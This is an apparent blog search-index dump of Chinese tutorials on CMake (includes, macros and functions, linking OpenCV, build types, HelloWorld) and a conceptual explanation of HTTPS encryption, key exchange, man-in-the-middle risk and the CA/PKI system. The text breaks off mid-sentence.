$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/world)","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake06-加载文件进行复用","date":"2019-12-05T15:00:00.000Z","path":"2019/12/06/CMake06加载文件进行复用/","text":"CMake文件种类CMake除了配置文件CMakeList.txt 之外，还可以通过include的方式加载文件 类似于头文件 加载公用函数最常见的使用方法就是用来加载一些公用的函数 1include(MultiplexingFunc.cmake) 根据平台不同组织逻辑还可以根据内部逻辑来组织CMake代码，例如不同的平台加载不同的文件 12345if(IOS) include(CMakeLists_iOS.cmake)else(APPLE) include(CMakeLists_Apple.cmake)endif() 其中 IOS 和 APPLE 变量来自于CMake官方文档Variables that Describe the System","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake05-函数和宏的对比","date":"2019-12-04T15:00:00.000Z","path":"2019/12/05/CMake05函数和宏的对比/","text":"CMake的函数和宏CMake本身整理逻辑可以通过 宏（macro） 和 函数（function），声明十分类似 官方文档说明在宏的官方文档中有提到两者不同的问题，提出了两点主要的差别 宏是类似C语言的预处理，大部分是字符串替换，不会有函数内的变量 遇到return()宏不会停止，函数会直接返回 123456The macro command is very similar to the function() command. ......In a function, ARGN, ARGC, ARGV and ARGV0, ARGV1, … are true variables in the usual CMake sense. In a macro, they are not, they are string replacements much like the C preprocessor would do with a macro. .....Another ..... .... return() in a macro body does not just terminate execution of the macro; ...... 更重要的区别Scope不同例如我们想输入一个变量获得结果，有两种方式，但是经过对比可以发现 load_message_func 并不能正确输出 原因是因为func拥有单独的scope, variable 和外部的并不通用，C语言里一般会采用传入指针来解决 123456789101112131415161718# 声明Macromacro(load_message_macro variable) set($&#123;variable&#125; &quot;message_one&quot;)endmacro()# 声明Funcfunction(load_message_func variable) set($&#123;variable&#125; &quot;message_two&quot;)endfunction()# 使用Macroload_message_macro(MESSAGE_ONE)message(&quot;load_message_macro : &quot; $&#123;MESSAGE_ONE&#125;)# 使用Funcload_message_func(MESSAGE_TWO)message(&quot;load_message_func : &quot; $&#123;MESSAGE_TWO&#125;) CMake里的函数是没有返回值的，也就是说需要有方法做到类似JS的作用域提升 12345678910111213# 声明Func，并采用作用域提升function(load_message_parent variable) set($&#123;variable&#125; &quot;message_three&quot;) # 变量提升 # $&#123;variable&#125; 被展开成 MESSAGE_THREE # $&#123;$&#123;variable&#125;&#125; 被展开成 message_three 即 MESSAGE_THREE 的值 # PARENT_SCOPE 指父作用域，是set方法的参数 set($&#123;variable&#125; $&#123;$&#123;variable&#125;&#125; PARENT_SCOPE)endfunction()# 使用了变量提升的Funcload_message_parent(MESSAGE_THREE)message(&quot;load_message_parent : &quot; $&#123;MESSAGE_THREE&#125; &quot;\\n&quot;)","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake04-添加第三方库","date":"2019-12-03T15:00:00.000Z","path":"2019/12/04/CMake04添加第三方库/","text":"添加库依赖添加源文件和头文件之后，对于库的依赖可以使用 1target_link_libraries(&lt;target&gt; ... &lt;item&gt;... ...) 其中item可以使用的范围包括以下这些，其中最常用的就是库文件的路径 原文 解释 A library target name 使用 add_library() 定义的对象 A full path to a library file 一个库文件的路径 A plain library name 一个库的名字，会在编译过程中默认使用，如果没有就报错 A link flag 一些编译标记位 A generator expression 通配符表达式 如何找到第三方库如何找到第三方库的路径，则是整个命令的基础，一般分为两种方式 自行编译的第三方库 支持CMake指令的第三方库 自行编译如果是自行编译的第三方库，无非是放到一个已知的位置（例如工程目录libs下） 1target_link_libraries(HelloWorld $&#123;CMAKE_CURRENT_LIST_DIR&#125;&#x2F;libs&#x2F;lib.a) 支持CMake指令的第三方库CMake本身提供了一个指令叫 find_package 来查找存在哪些第三方库 12# 参数列表很长此处省略find_package(&lt;PackageName&gt; ..........) 其工作原理是根据输入的名字PackageName，全局搜索三个配置文件，来获取这个库的配置相关配置 三个配置文件分别是 FindPackageName.cmake 、PackageNameConfig.cmake、packagename-config.cmake 以OpenCV举例搜索第三方库Mac系统可以使用HomeBrew安装OpenCV, 不然只能手动编译，配置更加复杂一些 1brew install opencv 如何查找安装完成后在CMakeLists.txt 使用指令 find_package 即可获得两个变量 OpenCV_INCLUDE_DIRS 当前OpenCV库的头文件目录 OpenCV_LIBS 当前OpenCV的所有库 12345find_package(OpenCV REQUIRED)target_include_directories(HelloWorld PRIVATE $&#123;OpenCV_INCLUDE_DIRS&#125;)target_link_libraries(HelloWorld $&#123;OpenCV_LIBS&#125;) 如果打印出来可以看到其输出 12345# OpenCV include directories: /usr/local/Cellar/opencv/4.1.1_1/include/opencv4message(&quot;OpenCV include directories: &quot; $&#123;OpenCV_INCLUDE_DIRS&#125; &quot;\\n&quot;)# OpenCV libraries: opencv_calib3dopencv_core......message(&quot;OpenCV libraries: &quot; $&#123;OpenCV_LIBS&#125; &quot;\\n&quot;) 如何确定变量名为什么OpenCV使用了 OpenCV_INCLUDE_DIRS 、OpenCV_LIBS 这两个变量名 命名规则 PackageName 加上 _INCLUDE_DIRS、_LIBS 是众多第三方库约定俗成的习惯 CMake官方文档并没有强制要求，最终还是取决于其CMake配置文件的内容 我们可以去自己查看 OpenCV的配置文件在哪根据CMake的官方要求，OpenCV的配置文件应该是 FindOpenCV.cmake OpenCVConfig.cmake opencv-config.cmake 这三个文件之一，根据查找Homebrew或者源文件我们可以看到其位置，并且使用的是 OpenCVConfig \b的名字 1234# Home brew/usr/local/Cellar/opencv/4.1.1_1/lib/cmake/opencv4/OpenCVConfig.cmake# Source Code../opencv-4.1.0/cmake/templates/OpenCVConfig.cmake.in 我们可以看到文件中存在说明定义了哪些变量 123# This file will define the following variables:# - OpenCV_LIBS : The list of all imported targets for OpenCV modules.# - OpenCV_INCLUDE_DIRS : The OpenCV include directories. 两种CMake的查找模式根据CMake的官方文档，还存在一种备用的Module模式，其配置文件类似于Config的命名规则 1The command has two modes by which it searches for packages: “Module” mode and “Config” mode. The above signature selects Module mode. If no module is found the command falls back to Config mode, described below. This fall back is disabled if the MODULE option is given.","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake03-添加文件和产物","date":"2019-12-02T15:00:00.000Z","path":"2019/12/03/CMake03添加文件和产物/","text":"源文件和Executable根据编译基本概念，每一个可执行程序（Executable，Target、Package）都是由许多的源文件组成 CMake很直接的表达， 参数分别为 （名称 平台标记 源文件可变参数） ，平台标记一般可以先不考虑 12# add_executable(&lt;name&gt; [WIN32] [MACOSX_BUNDLE] [EXCLUDE_FROM_ALL] [source1] [source2 ...])add_executable(HelloWorld main.cpp) 添加头文件添加头文件有两个命令，一个在2.8.10之后生效，更加突出了Target的概念 12345678# 2.8.10之前include_directories([AFTER|BEFORE] [SYSTEM] dir1 [dir2 ...])# 2.8.10之后target_include_directories(&lt;target&gt; [SYSTEM] [BEFORE] &lt;INTERFACE|PUBLIC|PRIVATE&gt; [items1...] [&lt;INTERFACE|PUBLIC|PRIVATE&gt; [items2...] ...]) 在 target_include_directories 最大的改变我们可以对头文件设置分类 PRIVATE 和 PUBLIC 会被放入Target的变量 INCLUDE_DIRECTORIES，PUBLIC 和 INTERFACE 则会被放入 INTERFACE_INCLUDE_DIRECTORIES 变量 文件太多怎么处理当时用到添加源文件和头文件的命令时，随着工程增大会逐渐发现两个问题 文件数目越来越多，比较难以维护CMakeLists.txt 文件结构越来越复杂，目录层级变得多 为了解决这两个问题，我们可以使用 file 命令的GLOB功能 123456789# 非递归查找file(GLOB &lt;variable&gt; [LIST_DIRECTORIES true|false] [RELATIVE &lt;path&gt;] [CONFIGURE_DEPENDS] [&lt;globbing-expressions&gt;...])# 递归查找file(GLOB_RECURSE &lt;variable&gt; [FOLLOW_SYMLINKS] [LIST_DIRECTORIES true|false] [RELATIVE &lt;path&gt;] [CONFIGURE_DEPENDS] [&lt;globbing-expressions&gt;...]) 例如我们递归选出所有的cpp文件，其中使用到了一些其他知识 CMAKE_CURRENT_LIST_DIR: 当前CMakeLists.txt所处于的目录，注意和 PROJECT_SOURCE_DIR 的区别 message: 相当于日志方法，可以接受可变参数 123456# 递归查找当前 CMakeLists.txt 文件下 source 内的以 cpp 结尾的文件file(GLOB_RECURSE CPP_FILES $&#123;CMAKE_CURRENT_LIST_DIR&#125;/source/*.cpp)message(&quot;Glob List file : &quot; $&#123;CPP_FILES&#125; &quot;\\n&quot;)add_executable(HelloWorld $&#123;CPP_FILES&#125;)","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake02-编译配置Debug或Release","date":"2019-12-01T15:00:00.000Z","path":"2019/12/02/CMake02编译配置DebugRelease/","text":"影响编译行为的配置CMake会影响编译行为的参数有很多，其中最常用的就是 CMAKE_BUILD_TYPE 可能的值包括空值、非空值Debug, Release, RelWithDebInfo, MinSizeRel 等 其中Debug和Release是最常用的两个选项，直接影响到了可不可以打断点调试 如何配置 CMAKE_BUILD_TYPE配置 CMAKE_BUILD_TYPE 有两种方式 在cmake的配置指令 “cmake .” 阶段通过 -D 传入该参数 在CMakeList.txt里写入 SET(CMAKE_BUILD_TYPE “Debug”) 指定该参数 在配置阶段传入以HelloWorld的的举例 12345678 #切换到文件夹cd HelloWorld#cmake指令，帮助用户生成 makefile 文件 build.makecmake . -D CMAKE_BUILD_TYPE=&quot;Debug&quot;#make指令， 帮助用户完成编译的调度make . #运行 HelloWorld 程序 ./main 注意在 -D 指令传入参数时有多种方法，以下都是正确的 -D 之后是否加空格 赋值采用 = 或 : 1234cmake . -D CMAKE_BUILD_TYPE=&quot;Debug&quot;cmake . -D CMAKE_BUILD_TYPE:&quot;Debug&quot;cmake . -DCMAKE_BUILD_TYPE=&quot;Debug&quot;cmake . -DCMAKE_BUILD_TYPE:&quot;Debug&quot;","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake01-CMake构建HelloWorld","date":"2019-12-01T01:00:00.000Z","path":"2019/12/01/CMake01构建HelloWorld/","text":"\bCMake的基本概念在阅读这个系列文章之前，需要掌握一些简单的前置概念 编译器: gcc、llvm 作用于高级语言的文件类似 .cpp .m 将其变化成目标文件 .o Make: 一种执行顺序的调度工具, 因为编译是有顺序的，通过make脚本可以确定调度顺序 而CMake是用于组织工程结构的面向过程语言，和以上三个概念的关系可以简单解释为 CMake通过解析自己的语言文件 CMakeLists.txt 帮助用户生成 makefile 文件 build.make build.make 中根据平台不同使用不同的编译命令完成编译 Hello World分析一个简单的 Hello World 工程, 首先新建文件夹，并且建立对应的文件 123----HelloWorld --CMakeLists.txt &#x2F;&#x2F;CMake的配置文件 --main.cpp &#x2F;&#x2F;工程源文件 然后我们可以通过以下三个指令，分别完成上述的文章开头的三个功能 12345678# 切换到文件夹cd HelloWorld# cmake指令，帮助用户生成 makefile 文件 build.makecmake .# make指令， 帮助用户完成编译的调度make# 运行 HelloWorld 程序 ./main 整个过程中有两个入门级的问题 为什么会生成一堆文件 CMake会以输入的目录为参考，根据CMakeLists.txt生成一套 Scheme（Apple的叫法），作用是用来描述如何编译当前的代码 在实际工程中一般不会这么粗暴的使用当前目录 “.” 干扰工程的文件结构 ，而是使用一个专门的Build目录，参考CMake02章节。 build.make 在哪 执行完CMake会生成不止一个 .make 文件，build.make 位于 “./CMakeFiles/HelloWorld.dir/build.make” 原因在于make本身是一个调度工具，不仅仅只用来编译，可以用于任何的指令调度 CMakeLists.txt 配置根据前文，CMakeLists.txt 是一个对工程文件描述的过程语言，HelloWorld中配置内容如下 123456# 当前CMake的最低版本cmake_minimum_required(VERSION 3.14)# 当前工程的名字project(HelloWorld) # 生成程序的名字，以及使用哪些源文件add_executable(main main.cpp) 和成熟的IDE对比，这份配置文件十分的简陋，而且缺少了很多常见的概念，例如头文件、第三方库等等 后续文章我们会以 Xcode 、Android Studio为对比一步步讲解和对比这些细节 最后补充main.cpp的内容 123456#include &lt;iostream&gt;int main() &#123; std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl; return 0;&#125; CMake的周期CMake对其能力划分了功能周期, 更详细的内容可以阅读官方文档，其中大致分为 Generate a Project Buildsystem Build a Project Install a Project 我们刚刚的指令 “camke .” 就是 Generate， “make .” 就是 Build，官方文档给出了更方便的命令 “cmake –build”","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake前置-编译的基本概念","date":"2019-11-30T15:00:00.000Z","path":"2019/12/01/CMake00编译的基本概念/","text":"如何描述一个工程工程本身是对代码的组织方式，有一些公共的概念 抽象概念 含义 源文件（Source） 被编译的文件，最终转化成二进制 头文件 (Header) 不会被编译的文件，声明（Declare）文件，用于协助别的源文件找到定义 源文件的产物 一个可执行的程序，由多个源文件编译而来 目标的管理器 可执行程序的管理，例如目标1由A、B、C文件组成，目标2由B、C、D文件组成，其中B、C两个文件被复用 管理器的空间 目标管理器的管理器，用于组织多个目标在一个范围内工作 头文件目录 如果存在多个目录，那么头文件路径的前缀会不一致，前缀不同的源文件就需要知道该头文件所在的位置，头文件目录提供这个位置方便源文件在编译中索引 源文件目录 所有源文件存放的根目录，方便工程以此目录作为绝对目录开始组织源文件 静态库目录 如果依赖第三方库，需要知道该静态库存放的位置，用于编译 动态库目录 如果依赖第三方库，需要知道该动态库存放的位置，用于编译 iOS、Android、C++ 中如何描述工程由于上述的公共概念并没有严格的规定，所以对这些概念在不同的平台和语言中也有区别 抽象概念 iOS Android C++ 源文件 .mm .java .cpp 头文件 .h .hpp 源文件的产物 Target Package Executable、Target 目标的管理器 Project Module Project 管理器的空间 Workspace Project Directory 头文件目录 Include Path Package Include 源文件目录 Source Root Source Root Source Root 静态库目录 Library Path Dependencies Library Path 动态库目录 Framework Path Dependencies Library Path 重点和常见的微妙差别有一些重点是 各种目录不是共享的，一般以源文件的目标作为分割线，不同的目标各自的头文件目录等都是独立的 有些语言是没有头文件的，例如Java，并且大家都在往这个方向演进，例如Swift 头文件不会参与编译，仅仅是为了让人可读并且知晓定义而存在的 头文件目录概念存在原因是因为实际工程中不可能把所有文件都放在同一个目录下（当然也有例外，比如早期的iOS工程就是都在同一个目录下） 不同平台的动态库称呼不太一样 这里解释一些微妙的差别 iOS、Android的Project概念范围不一致，Android中的Project是一个顶级概念，而iOS则用Workspace这个称呼 Android或者说Java语言对于目标和目标的管理器区别没有那么严格，一般来讲编译的目标都是Module（虽然也可以编译Package），而iOS则是Target，C++等类C语言一般编译目标是Executable，但是CMake中也使用Target这个称呼，存在混用现象（Project更多是管理器作用） SourceRoot这个概念很重要，所以任何平台对这个定义都很一致，一般使用src、source、Source等文件夹表示 动态库和静态库目录的区分和语言相关性很强，iOS是分开两个目录，Android不区分动态静态、而C++区分动态库和静态库，但是目录统一称呼为Library Path","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"HTTPS协议从顶至底解析","date":"2019-04-30T15:00:00.000Z","path":"2019/05/01/HTTPS协议从顶至底解析/","text":"HTTP 要点回顾由于 HTTP 是基于 Readable String 的协议体系，取决于其设计原理，传输内容没有校验机制，而且很容易被篡改 加密传输基础问题对称加密最简单的加密方法就是对称加密，使用加密算法和 Key 将明文转化成持有 Key 的用户可以解读的密文 1234//加密算法逻辑： 明文+Key 通过加密算法得到 密文SecretString = encrypt_algorithm(Key + PlainString)//解密算法逻辑 密文+Key 通过解密算法得到 明文PlainString = decrypt_algorithm(Key + SecretString) 作为对称加密的经典思路，通过简单思考很容易引发（问题1-1） 问题1-1: 如何传递Key，是通过物理传递还是网络？传递人或者传递通道是否可信 非对称加密而非对称加密算法可以很容易的解决对称加密引发的问题 1234//加密算法逻辑： 明文+公钥Key 通过加密算法得到 密文SecretString = encrypt_algorithm(PublicKey + PlainString)//解密算法逻辑 密文+私钥Key 通过解密算法得到 明文PlainString = decrypt_algorithm(PrivateKey + SecretString) 根据非对称加密的思路，PublicKey 是可以任意传递和分发的，而 SecretString 也仅仅能被 PrivateKey 解密 那么在对称加密的问题1-1对应的解法就有了 解法1-1: 因为 PublicKey 可以任意传递，而 PrivateKey 仅能被自己持有（任何时候都不能传递），不需要担心传递过程中的传递人和通道可信程度 在通信的过程中，按照 C/S 架构设计通常存在 Server 和 Client 两个终端 完成了 Client–&gt;Server 加密逻辑，如何保证返回报文 Server–&gt;Client 也具备加密能力，就是（问题1-2） 问题1-2: 如何完成点对点的加密能力 点对点加密在对称加密的设计下 Server 和 Client 公用一个Key，加密解密都使用这个Key即可, 时序图 123456789101112131415161718192021222324252627282930313233343536//ReqStr: Request String ResStr: Response String//SecretReq: Secret Request Sting SecretRes: Secret Response String +----------------+ +----------------+ | Client | | Server | | | | | | Key | | Key | +-------+--------+ +-------+--------+ | | | | | SecretReq | receive: SecretReqtext: ReqStr | | decrypt:decrypt: +-----------------------------&gt; algorithm(Key + SecretReq)algorithm(Key + ReqStr) | | read: ReqStrsend: SecretReq | | | | + | | | | | | | | | | | | | | v | | | SecretRes | text: ResStrreceive: SecretRes | | decrypt:decrypt: &lt;-----------------------------+ algorithm(Key + ResStr)algorithm(Key + SecretRes)| | send: SecretResread: ResStr | | | | | | | | | | | | | | + + 而在非对称加密的设计下 因为 PublicKey 加密后仅有 PrivateKey 可以解密，而 PrivateKey 又不能传递（不然就需要面对和对称加密一样的问题） 那么在非对称加密的设计下，点对点就需要两个密钥对（共计4个密钥） 密钥 作用 Server-PublicKey 用于加密Client–&gt;Server的通信 Server-PrivateKey 用于解密，不应该以任何渠道离开Server Client-PublicKey 用于加密Server–&gt;Client的通信 Client-PrivateKey 用于解密，不应该以任何渠道离开Client 根据 对称加密 和 非对称加密 的设计，我们可以得到时序图 1234567891011121314151617181920212223242526272829303132333435//C-PubKey: Client Public Key C-PriKey: Client Private Key//S-PubKey: Server Public Key S-PriKey: Server Private Key +----------------+ +----------------+ | Client | | Server | | | | | | C-PriKey | | S-PriKey | +-------+--------+ +-------+--------+ | | | | | SecretReq | receive: SecretReqtext: ReqStr | | decrypt:decrypt: +-----------------------------&gt; algorithm(S-PriKey + SecretReq)algorithm(S-PubKey + ReqStr) | | read: ReqStrsend: SecretReq | | | | + | | | | | | | | | | | | | | v | | | SecretRes | text: ResStrreceive: SecretRes | | decrypt:decrypt: &lt;-----------------------------+ algorithm(C-PubKey + ResStr)algorithm(C-PriKey + SecretRes) | | send: SecretResread: ResStr | | | | | | | | | | | | | | + + 通过时序图，我们可以得到 解法1-2: 为了实现点对点加密，对称加密通过 Client/Server 使用同一个Key，而非对称通信通过 Client/Server 各自生成一对Key（共计4个）来完成 在通常的互联网服务中，大多数都是多个客户端和一个服务器的多对一服务，在多对一的设计中必然存在以下问题： 问题1-3: 如何保证每一个通信之间加密的独立 问题1-4: 如何保证密钥的更新逻辑 密钥的分配和管理在对称加密中，因为使用同一个Key，那么 问题1-3必然需要无数个密钥来对应不同的通信 问题1-4每次都需要通知到对应的客户端来完成更新，而且每一次执行，都会再次面临问题1-1 而非对称加密中因为 Server–&gt;Client的 Response 是由 ClientPublicKey 加密的 而ClientPublicKey 必须和 ClientPrivateKey 配对使用，从设计上保证了问题1-3 而非对称加密对于问题1-4的解决方案，则是 HTTPS 的核心理论密钥交换机制 从结论上说，密钥交换从根本上解决了非对称加密的问题1-3和问题1-4 HTTPS 密钥交换密钥交换的基本逻辑HTTPS 的密钥交换设计保证加密通信的以下特性 加密是点对点的，每个Client都有自己的密钥对，C-PrivateKey永远不离开终端本身，保证了密钥不会被其它通信复用 Server\\Client 密钥更新可以做到独立，每次通信都可以使用新的密钥，使密钥的时效性更好 密钥交换原理中最重要的是 一旦密钥交换完成，通信就可以认为没有任何被破解攻击的可能，时序图如下 123456789101112131415161718192021222324252627282930313233 +-----------------+ +-----------------+ | | | | | Client | | Server | | | | | | | | | +--------+--------+ +--------+--------+ | | | | send: +-----------------------------&gt; | receive: Want S-PubKey | | Want S-PubKey | Want S-PubKey | | | + | | | | | | | | | | S-PubKey | vreceive:S-PubKey | |generate: | &lt;-------------------------------+ send: S-PubKeyC-PriKey C-PubKey | |encrypt: | |algorithm(S-PubKey+C-PubKey) | |send: Sec-C-PubKey | | | | + | Sec-C-PubKey | | | | receive: Sec-C-PubKey +----------------------------------------------&gt; | decrypt: | | algorithm(Sec-C-PubKey+S-PriKey) | | get: C-PubKey | Secret Message... | | &lt;------------------------------+ ...encrypt message by C-PubKey + + 由于 Client 每次发起通信请求，都可以先去服务器获取到最新的 ServerPublicKey 而 Client 在获取到 ServerPublicKey 之后可以即时生成 ClientKeyPair 保证了 Client 的更新 在传递 ClientPublicKey 的过程中，已经被加密过了，仅有 Server 可以用 S-PriKey 读取 Server 读取 ClientPublicKey 成功后，之后的通信就可以完成点对点的加密能力 根据密钥交换设计，每次通信建立 Server/Client 均使用的是最新的私钥，在通信关闭后可以直接丢弃不需要储存，从而得到问题1-3、1-4的解法 解法1-3、1-4: 非对称加密可以通过密钥交换机制来保证不同加密会话的独立，并且规避了密钥更新同步的问题 根据密钥交换的假设，一旦交换成功，会话就是99.9%安全的，那么加密问题被转化为一个简单的问题 问题2-1: 密钥交换过程中哪里会被攻击 密钥攻击的弱点密钥交换过程最大的攻击方式，就是中间人攻击 而攻击的方式就是在第一步，由一个中间人伪装服务器和客户端，分别和两方完成密钥互换，从而完成会话攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// M-PubKey: Middle Public Key , use for cheat client as S-PubKey, cheat server as C-PubKey// M-PriKey: Middle Private Key, use for decrypt message from server as C-PriKey, encrypt message to client as S-PriKey// +-----------------+ +-----------------+ +-----------------+ | | | | | | | Client | | Middle | | Server | | | | | | | | | | | | | +--------+--------+ +--------+--------+ +--------+--------+ | | | | | | send: -----------------------------&gt; | receive: | Want S-PubKey | | Want S-PubKey | | Want S-PubKey | | | | | | | | v | | | send: | receive: | | Want S-PubKey -----------------&gt; | Want S-PubKey | | |receive:M-PubKey | | | |gen: | | | | |C-PriKey C-PubKey | | v | |encrypt: | &lt;------------------------------- send: M-PubKey | |algorithm(M-PubKey+C-PubKey) | | | |send: Sec-C-PubKey | | | | | | | v | | receive:S-PubKey | | | | encrypt: | | | | algorithm(S-PubKey+M-PubKey) &lt;---------- send: S-PubKey | | | send: Sec-M-PubKey | | | | | | | | | | | | | +---------------------------&gt; | receive: Sec-M-PubKey | | | | decrypt: | | | | algorithm(Sec-M-PubKey+S-PriKey) | | Sec-C-PubKey | | get: M-PubKey | | | receive: Sec-C-PubKey | +----------------------------------------------&gt; | decrypt: | | | algorithm(Sec-C-PubKey+M-PriKey) | ...cheated by M-PubKey!!!! | | get: C-PubKey | !!!!!!!!!!!!!!!!!!!!!!!!!! | Secret Message... | | | &lt;------------------------------+ ...cheat get C-PubKey!!! | | | !!!!!!!!!!!!!!!!!!!!!!!!!! | | | | + + + 根据时序图，我们可以发现，第一步就存在一个中间服务器，使用一套密钥对 M-PubKey、M-PriKey 来进行伪装，那么他就可以截获所有会话内容 中间人密钥 对客户端 对服务端 MiddlePublicKey 伪装成ServerPublicKey下发给客户端 伪装成ClientPubKey发送给服务端 MiddlePrivateKey 用来解密Client的消息，相当于ServerPrivateKey 用来解密Server的消息，相当于ClientPrivateKey 通过以上分析可以得出，密钥交换的过程中进行攻击的基础，问题2-1的答案就是 解法2-1: 密钥交换的第一步，Client 发出 Want S-PubKey 索要申请，被中间人截获，是整个攻击的基础 在分析了攻击点之后，问题2-1就会引出问题2-2 问题2-2: 如何确定 Client Want S-PubKey 的请求，返回的PublicKey是真的，而不是被替换过的 Middle Public Key 首先给出答案的思路，问题2-2 的解决方案需要两个基础 数字签名技术 CA证书体系 数字签名技术首先需要明确的概念，在非对称加密通信中的常规加密思路， PublicKey 加密， PrivateKey 解密 而数字签名技术，则是 PrivateKey 加密， 而 PublicKey 解密，整个逆向的过程称之为签名 功能 加密密钥 解密密钥 非对称加密 PublicKey PrivateKey 数字签名 PrivateKey PublicKey 两种使用方式，都基于非对称加密，其中签名基于的前提是 PrivateKey 永远只能被终端持有，不应该以任何方式传播出去 12345678910111213141516171819202122232425262728293031323334353637383940414243//Send OriginalContent = &quot;A File Very Large&quot;OriginalAbstract = MD5(OriginalContent) = &quot;bfa284e87e76c2930adb7b9451a78fd7&quot;Signature = SignAlgorithm(OriginalAbstract + A-PriKey)//On GoingAttackContent = &quot;A File Attacked with content rewrite&quot;//ReceiveReceiveContent = AttackContent = &quot;A File Attacked with content rewrite&quot;ReceiveAbstract = MD5(ReceiveContent) = &quot;00cc57da72ce29d8999a5f65da0c8133&quot;DecryptAbstract = Algorithm(Signature + A-PubKey) = &quot;bfa284e87e76c2930adb7b9451a78fd7&quot;//Valid Signature FailureDecryptAbstract != ReceiveAbstract =&gt; &quot;We have been Attacked&quot;//// +---------------+ +---------------+ | | | | | Server | | Client | | | | | +-------+-------+ +-------+-------+ | | | | | | | | | |original: | |&quot;A File Very Large&quot; | | | |abstract: +------------ | receive:MD5(original) | +-----------------&gt; attack = &quot;A File Attacked with content rewrite&quot;&quot;bfa284e87e76c2930adb7b9451a78fd7&quot; | attack: | | &quot;A File Attacked | abstract:signature: | with content rewrite&quot; | MD5(attack)SignAlgorithm(abstract + A-PriKey) | | &quot;00cc57da72ce29d8999a5f65da0c8133&quot; | | | | decrypt: | | Algorithm(signature + A-PubKey) | | | | compare: | | decrypt_abstract != abstract | | CA证书体系回到问题2-2本身，如何让 Client 收到 S-PubKey 之后，能够确定这个 PublicKey 是没有被篡改过的 最简单的一个思路就是，存在一个第三方，可以明确告诉 Client 这个 S-PubKey 是不是可信的，这个第三方就是CA（Certificate Authority） CA运作的技术基础就是数字签名技术，通过引入第三个密钥对 CA-PublicKey、 CA-PrivateKey 然后分为两个模块来完成 模块 作用 证书 颁发给各个互联网服务商，也就是每一个HTTPS的服务器，通过 CA签名证明 S-PubKey 是真实有效的 PKI 委托生产商把 CA-PublicKey 安装到每一个终端（每一个笔记本、每一个iPhone），用于验证证书签名 其中PKI是（Public Key Infrastructure）的缩写，中文叫 公钥基础建设 是一个非盈利组织在管理 PKI 的基本要求是把 CA 的证书预装到每一个合法生产的设备上， 通过联合设备生产商规避了问题1-1 每个设备都有一个默认的列表，比如iPhone好像是有8个 这些 CA-PubKey 也是以证书的形式存在于手机中，是 CA 自己颁发给自己的证书，对自己的 PublicKey进行了签名 123456789101112131415161718192021 +-----------------+ | | +----------+ +---+ | CA | (Response) | | (CA-PriKey) | &lt;---+ |PKI: | +-----------------+ | | content:CA-PubKey | | | S-PubKeyCA_Sign | | | Domain | | | Expire | | | CA Name (deliver by Apple) content: | | | S-PubKey | | signature: v Domain | | CA_Sign(Sec_Content_Abstract) | v+-----------------+ || | (Request) +----------+| iPhone(Client) | | | || | +-----+ Server |+-----------------+ | | +----------+ 通过引入 CA的第三个密钥对 和 基于数字签名技术，我们得到了问题2-2的解决方案 解法2-2: 通过对每个服务器的S-PubKey进行签名，证明其有效性（证书），并且委托生产商传递CA-PubKey来验证证书签名，确保了 S-PubKey 可信 通过以上分析，如果再深层次分析引出了问题2-3 问题2-3: 整个PKI+证书的体系是不是完美的，存在不存在攻击的可能 解法2-3: 整个体系其实是非常脆弱的，攻击点大概率存在于Client端，其次是Server端 首先给出答案， 整个体系其实是非常脆弱的，攻击点首先存在于Client端，稍后会列举几个常见的例子 继续思考，除了Client之外，Server存在不存攻击的点，比如DNS劫持等等，不管任何手段都想达到让 Client 误认为假的Server为真，那么就可以引出问题2-4 问题2-4: 证书可不可以伪造，申请机制如何运作 对证书进行伪造如果相对证书进行伪造，需要考虑两种可能 攻击方案 方案条件 方案-A Client 终端受到控制，终端上 PKI 已经被攻击者攻破 方案-B Client 终端不受控制，并且 PKI 完善 攻击设备的 PKI 体系首先来考虑 方案-A 的前提条件，就是攻击设备的 PKI 体系 攻击 PKI 体系是最简单的，整个 PKI+Cert 的前提是设备内由生产商预装 CA-PubKey 是没按照预期安装好的，没有被篡改过的，如果想要篡改 手段 例子 恶意软件在越狱的手机直接修改 Android Su权限、iPhone越狱 诱导 Client 信任一个不是CA的证书（非法的PublicKey） Charles、铁道部12306 在完成了 PKI 攻击之后，我们可以添加任意的 PublicKey, 假设存在攻击密钥对 Fake-PublicKey、Fake-PrivateKey 我使用 Fake-PriKey 签名的任何证书都可会被设备认定成合法的CA证书 在方案-B中，我们无法控制设备的 PKI 列表， 也就是说必须有一张被真实CA机构签发对证书 那么就需要先解决 问题2-5: 问题2-5: 如何申请一张CA机构签发的证书 如何申请一张CA的签发最简单的解决方案就是买 其次是通过CA机构的工具联网申请，例如 LetsEncrypt 是一个2015年成立免费SSL证书组织，其工具叫 certbot 可以在各大软件源install 申请和申请QQ号没什么区别，主要是提交你想申请的域名，以及最重要的是验证方式（Challenge） 12345# --manual 代表手工更新，推荐使用自动更新，这里仅作讲解# --preferred-challenges 关键选项 有 dns tls-sni http 三种选项# --d 要申请签名的域名certbot --manual --preferred-challenges dns -d www.domain.com 可见如果想通过CA的证书申请，其中 challenge 的方式决定了我们如何通过验证 Challenge 验证方式 dns 在域名的 DNS 解析服务商里添加一条指定的记录，一般是一个TEXT记录的加密文本 tls-sni 在域名指向的服务器443端口修改服务器配置文件 http 在域名指向的服务器80端口放置指定的文件 此时我们可以得出问题2-5的答案 解法2-4、2-5: 如果想要获取一张合法的CA证书，需要提交申请的域名，并且通过Challenge 那么回到问题2-4，在申请机制的过程中，我们如何进行伪造来通过 Challenge 从而获取合法的证书 攻击CA证书 Challenge 服务首先我们可以发现 CA 的验证逻辑是，如果申请者可以控制域名的DNS服务（dns）或者主机文件（http、tls-sni），就认为该申请者是域名的合法持有者 控制DNS服务: 